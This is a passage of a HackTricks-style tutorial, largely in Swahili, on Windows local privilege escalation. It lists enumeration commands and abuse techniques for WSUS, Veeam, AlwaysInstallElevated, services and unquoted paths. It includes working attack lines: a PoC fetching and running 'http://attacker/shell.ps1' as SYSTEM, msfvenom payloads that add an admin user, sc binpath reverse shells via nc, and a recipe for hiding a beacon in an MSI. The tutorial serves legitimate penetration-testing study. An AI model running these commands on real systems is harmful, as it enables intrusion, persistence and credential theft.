# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Chombo bora cha kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Mwanzo ya Windows

### Access Tokens

**Ikiwa haujui Windows Access Tokens ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa habari zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa haujui integrity levels katika Windows ni nini, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo tofauti katika Windows ambayo yanaweza **prevent you from enumerating the system**, run executables au hata **detect your activities**. Unapaswa **read** ukurasa ufuatao na **enumerate** mifumo yote ya **defenses** **mechanisms** kabla ya kuanza privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Taarifa za Mfumo

### Version info enumeration

Angalia kama toleo la Windows lina udhaifu uliotambulika (pia angalia patches zilizowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) ni ya msaada kutafuta taarifa za kina kuhusu Microsoft security vulnerabilities. Hifadhidata hii ina zaidi ya 4,700 security vulnerabilities, ikionyesha **massive attack surface** ambayo mazingira ya Windows yanatoa.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson imejumuishwa)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info iliyohifadhiwa katika env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za Transcript za PowerShell

Unaweza kujifunza jinsi ya kuiwasha hapa: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline ya PowerShell yanarekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri, na sehemu za skripti. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya pato huenda yasikamatwe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuangalia matukio 15 ya mwisho kutoka kwenye PowersShell logs unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na yaliyomo yote ya utekelezaji wa script inarekodiwa, ikihakikisha kwamba kila block ya code imeandikwa wakati wa kuendesha. Mchakato huu unahifadhi audit trail kamili ya kila shughuli, muhimu kwa forensics na uchambuzi wa tabia hatarishi. Kwa kuandika shughuli zote wakati wa utekelezaji, hupatikana ufahamu wa kina kuhusu mchakato.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya logi za Script Block yanaweza kupatikana ndani ya Windows Event Viewer katika njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kudhoofisha mfumo ikiwa sasisho hazitaombwa kwa kutumia http**S** bali http.

Unaanza kwa kukagua kama mtandao unatumia sasisho la WSUS lisilo na SSL kwa kuendesha yafuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ikiwa unapata jibu kama mojawapo ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Basi, **inaweza kutumika kukashifiwa (exploitable).** Ikiwa registry ya mwisho ni sawa na `0`, basi ingizo la WSUS litatambulika kama lisiwepo (litapuuzwa).

Ili kuchukua nafasi ya udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Hizi ni MiTM weaponized exploits scripts za kuingiza 'fake' updates katika traffic ya WSUS isiyokuwa kupitia SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kwa msingi, hii ndio dosari ambayo bug hii inatumia:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Unaweza kutekeleza udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakapotolewa).

## Auto-Updaters za Watu wa Tatu na Agent IPC (local privesc)

Wakala wengi wa kampuni huweka wazi localhost IPC surface na chaneli ya update yenye ruhusa za juu. Ikiwa enrollment inaweza kulazimishwa kwenda kwenye server ya mshambulizi na updater inaamini rogue root CA au ukaguzi dhaifu wa saini, mtumiaji wa ndani anaweza kuwasilisha MSI yenye madhara ambayo huduma ya SYSTEM itaweka. Angalia mbinu iliyojumuishwa (based on the Netskope stAgentSvc chain – CVE-2025-0309) hapa:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` inaweka wazi huduma ya localhost kwenye **TCP/9401** ambayo inachakata ujumbe unaodhibitiwa na mshambulizi, ikiruhusu amri zozote kama **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha listener na version, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika katika directory ile ile, kisha chochea payload ya SYSTEM kupitia socket ya ndani:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma inatekeleza amri kama SYSTEM.
## KrbRelayUp

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya yanajumuisha mazingira ambapo **LDAP signing is not enforced,** watumiaji wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** pamoja na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba haya **mahitaji** yanatimizwa kwa kutumia **mipangilio ya chaguo-msingi**.

Pata **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa habari zaidi kuhusu mtiririko wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** vifunguo viwili vya rejista **vimewezeshwa** (thamani ni **0x1**), basi watumiaji wenye ruhusa yoyote wanaweza **install** (execute) `*.msi` faili kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una meterpreter session unaweza kuendesha kiotomatiki mbinu hii kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa Windows MSI binary ili kupandisha ruhusa. Script hii inaandika msanidi MSI uliotayarishwa awali unaouliza kuongeza mtumiaji/kikundi (so you will need GIU access):
```
Write-UserAddMSI
```
Endesha tu binary iliyotengenezwa ili kupandisha vibali.

### MSI Wrapper

Soma mafunzo haya ili kujifunza jinsi ya kuunda MSI wrapper ukitumia zana hizi. Kumbuka kwamba unaweza ku-wrap faili **.bat** ikiwa unataka tu kuendesha mistari ya amri


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** payload mpya ya **Windows EXE TCP** kwa kutumia Cobalt Strike au Metasploit katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bonyeza **Next**.
- Mpa mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa mahali, chagua **place solution and project in the same directory**, na bonyeza **Create**.
- Endelea kubofya **Next** hadi ufikie hatua ya 3 kati ya 4 (choose files to include). Bonyeza **Add** na chagua Beacon payload uliyotengeneza. Kisha bonyeza **Finish**.
- Chagua mradi **AlwaysPrivesc** katika **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna mali nyingine (properties) unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bonyeza kwa mkono wa kulia mradi na chagua **View > Custom Actions**.
- Bonyeza kwa mkono wa kulia **Install** na chagua **Add Custom Action**.
- Bonyeza mara mbili **Application Folder**, chagua faili yako **beacon.exe** na bonyeza **OK**. Hii itahakikisha kuwa beacon payload itaendeshwa mara msakinishaji unapoanzishwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Hatimaye, jenga mradi.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` linaonekana, hakikisha umeweka jukwaa (platform) kuwa x64.

### MSI Installation

Ili kuendesha **installation** ya faili `.msi` yenye madhumuni mabaya kwa usuli:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kufanya exploit kwenye udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vichunguzi

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kile kinacho **kurekodiwa**, hivyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua wapi logs zinatumwa
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, ikihakikisha kuwa kila nywila ni **ya kipekee, iliyochaguliwa kwa bahati nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, zikiruhusu kuona nywila za admin wa ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewezeshwa, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **kuzuia** majaribio ya michakato isiyoaminika ya **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Lengo lake ni kulinda credentials zilizo hifadhiwa kwenye kifaa dhidi ya vitisho kama pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** zinathibitishwa na **Local Security Authority** (LSA) na zinatumika na vipengele vya mfumo wa uendeshaji. Wakati data za kuingia za mtumiaji zinathibitishwa na kifurushi cha usalama kilichosajiliwa, kawaida huanzishwa domain credentials za mtumiaji.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Orodhesha Watumiaji & Vikundi

Unapaswa kuangalia ikiwa kuna vikundi ambavyo wewe ni mwanachama wake vinavyokuwa na ruhusa zenye kuvutia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vyenye ruhusa

Ikiwa wewe **ni sehemu ya kundi lenye ruhusa maalum unaweza kuwa na uwezo wa kuongeza ruhusa**. Jifunze kuhusu vikundi vyenye ruhusa na jinsi ya kuvitumia vibaya ili kuongeza ruhusa hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Ushughulikiaji wa token

**Jifunze zaidi** kuhusu ni nini ni **token** kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token zenye kuvutia** na jinsi ya kuvitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nywila
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato Yanayoendelea

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato, **check for passwords inside the command line of the process**.\
Angalia kama unaweza **overwrite some binary running** au kama una write permissions za folda ya binary ili kutumia uwezekano wa [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** kuendesha, unaweza kuvitumia vibaya ili kupandisha ruhusa](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za binari za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za mafolda ya binaries ya michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Unaweza kuunda memory dump ya mchakato unaoendesha kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials in clear text in memory**, jaribu ku-dump memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazoendesha kama SYSTEM zinaweza kumruhusu mtumiaji kuzindua CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bonyeza "Click to open Command Prompt"

## Huduma

Service Triggers let Windows start a service when certain conditions occur (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Even without SERVICE_START rights you can often start privileged services by firing their triggers. See enumeration and activation techniques here:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya huduma:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma
```bash
sc qc <service_name>
```
Inashauriwa kupata binary **accesschk** kutoka _Sysinternals_ ili kuangalia ngazi ya ruhusa inayohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kuangalia kama "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha huduma

Ikiwa unapata hitilafu hii (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Kumbuka kwamba huduma ya upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Another workaround wa tatizo hili ni kuendesha:**
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika tukio ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye huduma, inawezekana kubadilisha binary inayotekelezwa ya huduma. Ili kubadilisha na kuendesha **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha huduma tena
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ruhusa zinaweza kupandishwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kuratibisha upya binary ya service.
- **WRITE_DAC**: Inawezesha kuratibisha ruhusa, na hivyo kuweza kubadilisha mipangilio ya service.
- **WRITE_OWNER**: Inaruhusu kupata umiliki na kuratibisha ruhusa.
- **GENERIC_WRITE**: Inamwarithi uwezo wa kubadilisha mipangilio ya service.
- **GENERIC_ALL**: Pia inamwarithi uwezo wa kubadilisha mipangilio ya service.

Kwa utambuzi na matumizi ya udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binaries za service

**Angalia kama unaweza kubadilisha binary inayotekelezwa na service** au kama una **idhini ya kuandika kwenye folda** ambako binary iko ([**DLL Hijacking**](dll-hijacking/index.html)).\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (sio katika system32) na kukagua ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kubadilisha rejista ya huduma

Unapaswa kuangalia ikiwa unaweza kubadilisha rejista yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako juu ya rejista ya **huduma** kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kukaguliwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory idhini

Kama una idhini hii juu ya registry, inamaanisha kuwa **unaweza kuunda sub registries kutoka kwa hii**. Katika kesi ya Windows services, hii ni **ya kutosha kutekeleza msimbo wowote:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Njia za Service zisizo na nukuu

Ikiwa njia kuelekea executable haiko ndani ya nukuu, Windows itajaribu kutekeleza kila sehemu ya njia ambayo iko kabla ya nafasi.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha njia zote za service ambazo hazina nukuu, ukiziondoa zile za built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mikono binary ya huduma na metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejesho

Windows inaruhusu watumiaji kubainisha vitendo vitakavyofanywa ikiwa service itashindwa. Kipengele hiki kinaweza kusanidiwa kuonyesha binary. Kama binary hii inaweza kubadilishwa, privilege escalation inaweza kuwa inawezekana. Maelezo zaidi yanaweza kupatikana katika [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu zilizosanikishwa

Angalia **permissions of the binaries** (labda unaweza overwrite moja na escalate privileges) na **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

Angalia kama unaweza kubadilisha baadhi ya config file ili kusoma faili maalum au kama unaweza kubadilisha binary itakayotekelezwa na akaunti ya Administrator (schedtasks).

Njia ya kupata ruhusa dhaifu za folda/mafaili kwenye mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
